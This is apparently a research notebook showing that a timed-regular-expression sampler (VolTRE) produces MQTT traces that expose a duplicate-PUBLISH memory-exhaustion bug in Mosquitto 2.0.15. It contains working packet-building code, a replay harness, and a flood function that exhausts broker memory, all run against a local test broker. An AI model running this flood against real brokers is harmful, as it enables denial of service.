# MQTT QoS-2 Case Study: Discovering CVE-2023-28366 with VolTRE

**Goal.** Show that VolTRE — a uniform sampler for *Timed* Regular Expressions (TREs) —
naturally produces traces that expose a real memory-exhaustion bug in Mosquitto ≤ 2.0.15,
**without any prior knowledge of the vulnerability**.

---

## Why TRE, not plain regex?

A regex like `CONNECT · PINGREQ* · PUBLISH · (PUBLISH|PINGREQ)* · PUBREL · PINGREQ* · DISCONNECT`
has **infinite** language volume: the Kleene stars admit arbitrarily long event sequences with
no bound on inter-event timing. There is no natural probability measure over an infinite,
unweighted language, so **uniform sampling is impossible without timing constraints**.

A TRE adds timing bounds derived from protocol parameters:

| Parameter | Value | Source |
|---|---|---|
| *K* = 10 s | keepalive window | MQTT 3.1.1 §3.1.2.10 — broker disconnects after 1.5·*K* s of silence |
| *Δ* = 15 s | retransmission timeout | Client may resend PUBLISH (DUP=1) if no PUBREC arrives in *Δ* s |
| *T* = 60 s | session budget | Practical upper bound on test duration |

These bounds make each Kleene-star segment **finite and measurable**, enabling uniform
sampling over the full timed language.

---

## CVE-2023-28366 (Mosquitto ≤ 2.0.15, fixed in 2.0.16)

The broker queues a fresh PUBREC for every duplicate QoS-2 PUBLISH bearing the same
message ID, without limit. Each queued PUBREC is a `mosquitto__packet` struct (~80 bytes)
in the broker's `out_packet` linked list. A client that never drains its receive buffer
causes unbounded RSS growth.

The **fix** (commit 6113eac9 in 2.0.16): disconnect the client after the 2nd duplicate
(`dup_count ≥ 2`). One retransmission is still allowed.

**Trigger**: 3 or more PUBLISH packets with the same message ID on one connection.

## 1 — Setup

Load VolTRE from the repository root. See `SETUP.md` for environment prerequisites.

In [ ]:
import sys, os, warnings, random, socket, struct, time, subprocess
warnings.filterwarnings('ignore')

REPO = os.path.normpath(os.path.join(os.getcwd(), '..', '..', '..'))
if REPO not in sys.path:
    sys.path.insert(0, REPO)

from parse.quickparse import quickparse
from volume.slice_volume import slice_volume
from sample.sample import sample

phi_test = quickparse('<a.b>_[0,10]', string=True)
v_test   = slice_volume(phi_test, 2)
print(f'VolTRE OK — volume of <a.b>_[0,10] at n=2: {float(v_test.total_volume()):.1f}')

## 2 — TRE Specification

We write a **generic** model of a QoS-2 client session with keepalive.
None of the structure is tailored toward the bug; it directly reflects the protocol spec.

```
φ = ⟨ CONNECT
       · ⟨PINGREQ*⟩_[0,K]               -- keepalive pings while idle before first message
       · PUBLISH
       · ⟨(PUBLISH|PINGREQ)*⟩_[0,Δ]    -- optional retransmissions and pings
       · PUBREL
       · ⟨PINGREQ*⟩_[0,K]               -- keepalive pings while waiting for PUBCOMP
       · DISCONNECT
     ⟩_[0,T]
```

The **event count n** determines what mix is possible:
- n = 4 : no optional events — the minimal happy path
- n = 5 : one extra event (PINGREQ anywhere, or one PUBLISH retransmission)
- n = 6 : two extras — may include up to 2 extra PUBLISHes
- n ≥ 7 : higher mix; some traces will have 2+ extra PUBLISHes (the CVE trigger)

In [ ]:
K, DELTA, T = 10, 15, 60
SPEC = (
    f'<CONNECT.<PINGREQ*>_[0,{K}].PUBLISH'
    f'.<(PUBLISH+PINGREQ)*>_[0,{DELTA}]'
    f'.PUBREL.<PINGREQ*>_[0,{K}].DISCONNECT>_[0,{T}]'
)

phi = quickparse(SPEC, string=True)
print(f'Spec: {SPEC}')
print()

print(f'{"n":>4}  {"extra events":>14}  {"volume":>14}')
print('-' * 40)
vols = {}
for n in range(4, 8):
    v = float(slice_volume(phi, n).total_volume())
    vols[n] = v
    extras = n - 4
    print(f'{n:>4}  {extras:>14}  {v:>14.3e}')

## 3 — Sampling Timed Traces

We draw 60 timed traces with *n* chosen uniformly from {4, 5, 6, 7}.
Each trace is a sequence of (symbol, delay) pairs sampled uniformly from
the language of `φ` at the chosen event count.

**Classification**:
- 1 PUBLISH → normal session (no retransmissions)
- 2 PUBLISHes → first retransmission, allowed per spec and handled correctly by all broker versions
- ≥ 3 PUBLISHes → second+ retransmission → **CVE-2023-28366 trigger**

In [ ]:
random.seed(42)
N_TRACES = 60
N_RANGE  = [4, 5, 6, 7]

traces = []
for _ in range(N_TRACES):
    n = random.choice(N_RANGE)
    w = sample(phi, n)
    syms = [s for s, _ in w]
    traces.append({
        'word':   w,
        'syms':   syms,
        'n':      n,
        'n_pub':  syms.count('PUBLISH'),
        'n_ping': syms.count('PINGREQ'),
    })

normal   = [t for t in traces if t['n_pub'] == 1]
one_dup  = [t for t in traces if t['n_pub'] == 2]
cve_trig = [t for t in traces if t['n_pub'] >= 3]

print(f'Sampled {N_TRACES} traces  (n uniform in {N_RANGE})')
print(f'  1 PUBLISH  (no retransmission):     {len(normal):3d}  ({100*len(normal)/N_TRACES:.0f}%)')
print(f'  2 PUBLISHes (1 retransmission):     {len(one_dup):3d}  ({100*len(one_dup)/N_TRACES:.0f}%)  ← allowed')
print(f'  3+ PUBLISHes (2+ retransmissions):  {len(cve_trig):3d}  ({100*len(cve_trig)/N_TRACES:.0f}%)  ← CVE trigger')
print()

for label, subset in [('Normal', normal), ('CVE-triggering', cve_trig)]:
    if not subset:
        continue
    t = subset[0]
    print(f'Example {label} trace (n={t["n"]}, n_pub={t["n_pub"]}, n_ping={t["n_ping"]}):')
    for sym, delay in t['word']:
        print(f'  wait {float(delay):5.1f}s  →  {sym}')
    print()

## 4 — Start Mosquitto 2.0.15

We run the broker from an extracted Debian package (no root, no Docker).
See `SETUP.md` for extraction instructions.

Memory is read from `/proc/PID/status` VmRSS.

In [ ]:
MOSQ_BIN  = '/tmp/mosquitto-pkg/mosquitto-extracted/usr/sbin/mosquitto'
MOSQ_CONF = '/tmp/mosq_exp.conf'
MOSQ_PORT = 18830
MOSQ_LIBS = ':'.join([
    '/tmp/mosquitto-pkg/mosquitto-extracted/usr/lib/x86_64-linux-gnu',
    '/tmp/mosquitto-pkg/mosquitto-extracted/lib/x86_64-linux-gnu',
    '/tmp/mosquitto-pkg',
])

# ── MQTT packet builders ──────────────────────────────────────────────────────
def _enc_len(n):
    out = b''
    while True:
        b = n % 128; n //= 128
        out += bytes([b | (0x80 if n else 0)])
        if not n: break
    return out

def _str(s):
    b = s.encode(); return struct.pack('!H', len(b)) + b

def mk_connect(keepalive=60):
    body = _str('MQTT') + bytes([4, 0x02]) + struct.pack('!H', keepalive) + _str('')
    return bytes([0x10]) + _enc_len(len(body)) + body

def mk_publish(topic, payload, msgid, dup=False):
    flags = (2 << 1) | (8 if dup else 0)
    body  = _str(topic) + struct.pack('!H', msgid) + payload
    return bytes([(3 << 4) | flags]) + _enc_len(len(body)) + body

def mk_pubrel(msgid):
    return bytes([0x62, 0x02]) + struct.pack('!H', msgid)

def mk_pingreq():
    return bytes([0xC0, 0x00])

def mk_disconnect():
    return bytes([0xE0, 0x00])

# ── broker management ─────────────────────────────────────────────────────────
def get_rss_kb(proc):
    try:
        with open(f'/proc/{proc.pid}/status') as f:
            for line in f:
                if line.startswith('VmRSS:'):
                    return int(line.split()[1])
    except FileNotFoundError:
        pass
    return -1

def start_mosquitto(port=MOSQ_PORT):
    conf = f'listener {port} 127.0.0.1\nallow_anonymous true\nlog_type none\n'
    with open(MOSQ_CONF, 'w') as f:
        f.write(conf)
    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = MOSQ_LIBS
    proc = subprocess.Popen(
        [MOSQ_BIN, '-c', MOSQ_CONF], env=env,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    time.sleep(1.2)
    return proc

def stop_mosquitto(proc):
    proc.terminate(); proc.wait(timeout=5)

# Kill any leftover mosquitto processes from previous runs
import subprocess as _sp, signal
for entry in os.scandir('/proc'):
    if not entry.name.isdigit(): continue
    try:
        cmd = open(f'/proc/{entry.name}/cmdline').read()
        if 'usr/sbin/mosquitto' in cmd:
            os.kill(int(entry.name), signal.SIGTERM)
    except (PermissionError, FileNotFoundError, ProcessLookupError):
        pass
time.sleep(0.5)

mosq    = start_mosquitto()
rss0    = get_rss_kb(mosq)
print(f'Mosquitto 2.0.15 started  PID={mosq.pid}  RSS={rss0} kB')

# Sanity: one full QoS-2 round-trip
s = socket.socket(); s.settimeout(3); s.connect(('127.0.0.1', MOSQ_PORT))
s.sendall(mk_connect()); s.recv(64)               # CONNACK
s.sendall(mk_publish('t', b'hi', 1)); s.recv(64)  # PUBREC
s.sendall(mk_pubrel(1)); s.recv(64)               # PUBCOMP
s.sendall(mk_disconnect()); s.close()
print('Sanity: normal QoS-2 session OK')

## 5 — Protocol Conformance

MQTT 3.1.1 allows a client to retransmit a PUBLISH once (with DUP=1) if no PUBREC
arrives. The 2.0.16 fix adds a disconnect on the **second** duplicate (`dup_count ≥ 2`).

We send four consecutive PUBLISH packets (all same message ID):

| PUBLISH # | Meaning | Correct broker response |
|---|---|---|
| 1 | original | PUBREC |
| 2 | 1st retransmission (DUP=1) | PUBREC — still within spec |
| 3 | 2nd retransmission (DUP=1) | **DISCONNECT** (Mosquitto ≥ 2.0.16) |
| 4 | further evidence | — should never reach here |

Mosquitto 2.0.15 sends PUBREC for all four — **the CVE**.

In [ ]:
PTYPE = {2: 'CONNACK', 5: 'PUBREC', 7: 'PUBCOMP', 13: 'PINGRESP', 14: 'DISCONNECT'}

def send_n_publishes(n_total, host='127.0.0.1', port=MOSQ_PORT):
    """Send 1 original + (n_total-1) duplicate PUBLISHes. Return list of broker responses."""
    s = socket.socket(); s.settimeout(2)
    s.connect((host, port))
    s.sendall(mk_connect()); s.recv(64)  # CONNACK
    responses = []
    for i in range(n_total):
        s.sendall(mk_publish('t', b'hello', 1, dup=(i > 0)))
        try:
            r = s.recv(64)
            ptype = r[0] >> 4
            responses.append(PTYPE.get(ptype, f'type={ptype}'))
            if ptype == 14: break
        except ConnectionResetError:
            responses.append('DISCONNECT (TCP reset)')
            break
        except socket.timeout:
            responses.append('TIMEOUT')
            break
    try: s.close()
    except: pass
    return responses


responses = send_n_publishes(4)
notes = [
    'original',
    '1st dup (allowed)',
    '2nd dup — 2.0.16 disconnects here',
    '3rd dup — should never be reached',
]
print('Mosquitto 2.0.15 responses to consecutive PUBLISH(msgid=1):')
for i, (resp, note) in enumerate(zip(responses, notes), 1):
    print(f'  PUBLISH #{i} ({note}):  broker → {resp}')

print()
if all(r == 'PUBREC' for r in responses):
    print('CVE-2023-28366 confirmed: broker returned PUBREC for all duplicates (never disconnected).')
else:
    disc_at = next(i+1 for i, r in enumerate(responses) if r != 'PUBREC')
    print(f'Patched behaviour: broker disconnected at PUBLISH #{disc_at}.')

print()

# ------------------------------------------------------------------
# Replay the CVE-triggering traces sampled from our generic TRE spec.
# We compress timing (delay_scale=0.02) but preserve event ordering.
# ------------------------------------------------------------------
DELAY_SCALE = 0.02

def replay_trace(timed_word, host='127.0.0.1', port=MOSQ_PORT):
    """Replay a sampled trace. Return list of (symbol, broker_response) for each PUBLISH."""
    s = socket.socket(); s.settimeout(3)
    s.connect((host, port))
    s.sendall(mk_connect()); s.recv(64)
    pub_responses = []
    disconnected  = False
    try:
        for sym, delay in timed_word:
            time.sleep(float(delay) * DELAY_SCALE)
            if sym == 'CONNECT':
                continue
            elif sym == 'PUBLISH':
                s.sendall(mk_publish('t', b'fuzz', 1, dup=True))
                try:
                    r = s.recv(64)
                    ptype = r[0] >> 4
                    pub_responses.append(PTYPE.get(ptype, f'type={ptype}'))
                    if ptype == 14:
                        disconnected = True; break
                except ConnectionResetError:
                    pub_responses.append('DISC'); disconnected = True; break
            elif sym == 'PINGREQ':
                s.sendall(mk_pingreq())
                try: s.recv(64)
                except: pass
            elif sym == 'PUBREL':
                s.sendall(mk_pubrel(1))
                try: s.recv(64)
                except: pass
            elif sym == 'DISCONNECT':
                s.sendall(mk_disconnect())
    except Exception:
        pass
    finally:
        try: s.close()
        except: pass
    return pub_responses, disconnected


if cve_trig:
    print(f'Replaying {min(len(cve_trig), 8)} CVE-triggering traces from sampled set:')
    print(f'{"n_pub":>6}  {"n_ping":>6}  {"pub responses":<30}  {"disconnected?"}')    
    print('-' * 70)
    n_cve_confirmed = 0
    for t in cve_trig[:8]:
        resps, disconn = replay_trace(t['word'])
        if not disconn:
            n_cve_confirmed += 1
        resp_str = ' '.join(f'→{r}' for r in resps)
        print(f'{t["n_pub"]:>6}  {t["n_ping"]:>6}  {resp_str:<30}  {"NO (CVE!)" if not disconn else "YES"}')
    print(f'\n{n_cve_confirmed} of {min(len(cve_trig),8)} triggering traces: broker never disconnected.')
else:
    print('(No CVE-triggering traces in this sample — try rerunning cell-sampling with different seed)')

## 6 — Memory Exhaustion

The protocol violation has a measurable memory consequence.  Each duplicate PUBLISH
that receives a PUBREC causes the broker to queue a `mosquitto__packet` struct (~80 bytes)
in its `out_packet` linked list.  When the client's receive buffer is full (tiny `SO_RCVBUF`),
the broker cannot drain the queue: RSS grows linearly.

The first ~275 000 packets disappear into the kernel TCP buffers with no visible
RSS impact — that is the **knee** of the curve below.

In [ ]:
def flood_measure(host='127.0.0.1', port=MOSQ_PORT, duration_s=5, interval=25_000):
    """Open one connection, flood duplicate PUBLISHes without reading PUBRECs."""
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256)  # tiny recv buffer
    s.settimeout(duration_s + 2)
    s.connect((host, port))
    s.sendall(mk_connect())
    pub = mk_publish('t', b'x' * 100, 1, dup=True)
    points, n = [], 0
    t0 = time.monotonic()
    while time.monotonic() - t0 < duration_s:
        try:
            s.sendall(pub); n += 1
        except OSError:
            break
        if n % interval == 0:
            points.append((n, get_rss_kb(mosq)))
    try: s.close()
    except: pass
    return points


# Warm-up: 10 normal sessions to stabilise RSS
for _ in range(10):
    s = socket.socket(); s.settimeout(3); s.connect(('127.0.0.1', MOSQ_PORT))
    s.sendall(mk_connect()); s.recv(64)
    s.sendall(mk_publish('t', b'x', 1)); s.recv(64)
    s.sendall(mk_pubrel(1)); s.recv(64)
    s.sendall(mk_disconnect()); s.close()

baseline = get_rss_kb(mosq)
print(f'Baseline RSS (after 10 normal sessions): {baseline} kB')

print('Running 5-second flood...')
points = flood_measure(duration_s=5)
print(f'Collected {len(points)} data points')

print(f'\n{"packets sent":>14}  {"RSS (kB)":>10}  {"Δ (kB)":>8}')
print('-' * 38)
step = max(1, len(points) // 10)
for n, rss in points[::step]:
    print(f'{n:>14,}  {rss:>10}  {rss - baseline:>+8}')

## 7 — Analysis

**Left**: Language volume distribution across trace lengths.
The CVE trigger (3+ PUBLISHes) first appears at n = 6 and grows rapidly with n.

**Right**: Broker RSS during the PUBLISH flood — linear growth after TCP buffer saturation.

In [ ]:
import matplotlib.pyplot as plt
import numpy as np

fig, axes = plt.subplots(1, 2, figsize=(12, 4))

# ── Left: language volume ─────────────────────────────────────────────────────
ax = axes[0]
ns       = sorted(vols)
total_v  = sum(vols.values())
shares   = [vols[n] / total_v * 100 for n in ns]
colours  = ['#2196F3', '#4CAF50', '#FF9800', '#F44336']
bars     = ax.bar([str(n) for n in ns], shares, color=colours)
ax.axvline(x=1.5, color='red', linestyle='--', alpha=0.7,
           label='n ≥ 6: CVE trigger possible')
for bar, share in zip(bars, shares):
    ax.text(bar.get_x() + bar.get_width()/2, bar.get_height() + 0.3,
            f'{share:.1f}%', ha='center', va='bottom', fontsize=8)
ax.set_xlabel('n (events per trace)')
ax.set_ylabel('Share of total language volume (%)')
ax.set_title('VolTRE language volume by trace length\n(n uniform in {4,5,6,7})')
ax.legend()

# ── Right: RSS growth ─────────────────────────────────────────────────────────
ax2 = axes[1]
xs  = np.array([p[0] for p in points])
ys  = np.array([p[1] - baseline for p in points])
ax2.plot(xs / 1_000, ys, 'b-o', markersize=3, label='Broker RSS delta')

knee = next((i for i in range(1, len(ys)) if ys[i] > ys[i-1] + 50), None)
if knee is not None:
    ax2.axvline(xs[knee] / 1_000, color='orange', linestyle='--', alpha=0.8,
                label=f'TCP buffers full ({xs[knee]/1000:.0f}k pkts)')
    xs_fit = xs[knee:]
    if len(xs_fit) >= 3:
        coef = np.polyfit(xs_fit, ys[knee:], 1)
        bps  = coef[0] * 1024
        ax2.plot(xs_fit / 1_000, np.polyval(coef, xs_fit), 'r--', alpha=0.7,
                 label=f'Linear fit: {bps:.0f} B/dup PUBLISH')
        print(f'Growth rate: {bps:.0f} bytes per queued PUBREC')

ax2.set_xlabel('Duplicate PUBLISHes sent (thousands)')
ax2.set_ylabel('Broker RSS increase (kB)')
ax2.set_title('Mosquitto 2.0.15 RSS during PUBLISH flood\n(single connection, PUBRECs not drained)')
ax2.legend()
ax2.grid(True, alpha=0.3)

plt.tight_layout()
plt.savefig('memory_growth.pdf', bbox_inches='tight')
plt.show()
print('Saved: memory_growth.pdf')

## Summary

| Finding | Detail |
|---|---|
| **Bug** | CVE-2023-28366 — Mosquitto ≤ 2.0.15 |
| **Root cause** | Broker queues PUBREC for every duplicate QoS-2 PUBLISH without limit |
| **Protocol violation** | Should disconnect after 2nd duplicate (fixed in 2.0.16 commit 6113eac9) |
| **Memory impact** | ~80 B per queued PUBREC; linear RSS growth after TCP buffer saturation |
| **VolTRE spec** | Generic QoS-2 model with keepalive — derived from MQTT 3.1.1, not from bug knowledge |
| **Discovery** | Among 60 uniform samples, a natural fraction contain 3+ PUBLISHes and trigger the CVE |

### Why TRE was necessary

The Kleene-star segments `⟨PINGREQ*⟩_[0,K]` and `⟨(PUBLISH|PINGREQ)*⟩_[0,Δ]` have **infinite**
language volume without timing bounds.  The bounds *K* and *Δ* are not arbitrary — they
encode real protocol constraints (keepalive window and retransmission timeout), making the
spec both correct and measurable.  Plain regex sampling would require either fixing all
delays to zero (unrealistic) or choosing a timing distribution ad hoc (no principled basis).

VolTRE's uniform sampler gives the **unique natural probability measure** over the timed
language: each point in the feasible timing space is equally likely.  This makes the
fraction of CVE-triggering traces a well-defined, reproducible quantity.

### Generality

The same TRE approach directly extends to timing-sensitive bugs, for example the keepalive
eviction error in Mosquitto 2.0.21 (fixed in 2.0.22): the broker used a real-time clock
instead of a monotonic clock, causing spurious disconnections after NTP jumps.  Exposing
this requires sampling traces where the gap between PINGREQ packets is close to the
keepalive boundary — something TRE sampling produces naturally but regex sampling cannot
model.